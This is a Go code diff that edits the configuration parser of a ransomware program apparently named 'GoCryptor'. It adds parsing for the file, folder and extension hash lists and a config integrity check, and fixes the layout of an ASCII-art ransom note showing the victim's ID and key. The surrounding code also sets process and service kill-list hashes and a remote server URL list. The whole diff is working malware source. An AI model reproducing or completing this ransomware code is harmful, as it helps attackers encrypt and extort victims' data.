@@ -341,7 +341,7 @@ func parseConfig(configBuffer []byte) (Configuration, error) {
 
 	//parse process hash list
 	for {
-		config.processHashList = append(config.processHashList, binary.LittleEndian.Uint32(configBuffer[index:index+4]))
+		config.processHashList = append(config.processHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
 		index += 8
 		if string(configBuffer[index:index+8]) == "@cPeterr" {
 			break
@@ -351,7 +351,7 @@ func parseConfig(configBuffer []byte) (Configuration, error) {
 
 	// parse service hash list
 	for {
-		config.serviceHashList = append(config.serviceHashList, binary.LittleEndian.Uint32(configBuffer[index:index+4]))
+		config.serviceHashList = append(config.serviceHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
 		index += 8
 		if string(configBuffer[index:index+8]) == "@cPeterr" {
 			break
@@ -389,7 +389,7 @@ func parseConfig(configBuffer []byte) (Configuration, error) {
 	config.setRansomNoteContent(ransomNoteContent)
 
 	// parse ransom note hash
-	if ransomNoteContentHash != binary.LittleEndian.Uint32(configBuffer[index:index+4]) {
+	if ransomNoteContentHash != binary.LittleEndian.Uint32(configBuffer[index:index+8]) {
 		return config, fmt.Errorf("Wrong ransom note content hash")
 	}
 	config.setRansomNoteContentHash(ransomNoteContentHash)
@@ -408,38 +408,44 @@ func parseConfig(configBuffer []byte) (Configuration, error) {
 	config.setRunOnceString(runOnceString)
 
 	// parse fileHashList
+	for {
+		config.fileHashList = append(config.fileHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
+		index += 8
+		if string(configBuffer[index:index+8]) == "@cPeterr" {
+			break
+		}
+	}
+	index = skipSeparator(configBuffer, index)
 
-	// // add fileHashList
+	// parse folderHashList
 
-	// for _, eachHash := range config.fileHashList {
-	// 	binary.LittleEndian.PutUint32(hashBuffer, eachHash)
+	for {
+		config.folderHashList = append(config.folderHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
+		index += 8
+		if string(configBuffer[index:index+8]) == "@cPeterr" {
+			break
+		}
+	}
+	index = skipSeparator(configBuffer, index)
 
-	// 	result = append(result, hashBuffer...)
-	// }
-	// result = append(result, separator...)
+	// parse extensionHashList
 
-	// // add folderHashList
+	for {
+		config.extensionHashList = append(config.extensionHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
+		index += 8
+		if string(configBuffer[index:index+8]) == "@cPeterr" {
+			break
+		}
+	}
+	index = skipSeparator(configBuffer, index)
 
-	// for _, eachHash := range config.folderHashList {
-	// 	binary.LittleEndian.PutUint32(hashBuffer, eachHash)
+	configHash := bufferHashing(configBuffer[:len(configBuffer)-16])
 
-	// 	result = append(result, hashBuffer...)
-	// }
-	// result = append(result, separator...)
+	if configHash != binary.LittleEndian.Uint32(configBuffer[index:index+8]) {
+		return config, fmt.Errorf("Wrong config hash")
+	}
 
-	// // add extensionHashList
-	// for _, eachHash := range config.extensionHashList {
-	// 	binary.LittleEndian.PutUint32(hashBuffer, eachHash)
-
-	// 	result = append(result, hashBuffer...)
-	// }
-	// result = append(result, separator...)
-
-	// config.ransomNoteContentHash = bufferHashing(result)
-	// // add configurationHash
-	// binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
-	// result = append(result, hashBuffer...)
-	// result = append(result, separator...)
+	config.setConfigurationHash(configHash)
 
 	return config, nil
 }
@@ -486,7 +492,7 @@ func populateConfig() {
 	remoteServerURLList := [][]byte{[]byte("https://chuongdong.com"), []byte("http://chuongdong.com")}
 	config.setRemoteServerURLList(remoteServerURLList)
 
-	ransomNoteContent, err := compress([]byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  --> Your ID: %s\n--> Your key: %x\n"))
+	ransomNoteContent, err := compress([]byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  \n--> Your ID: %s\n--> Your key: %x\n"))
 
 	if err != nil {
 		fmt.Println("Can't compress", err.Error())
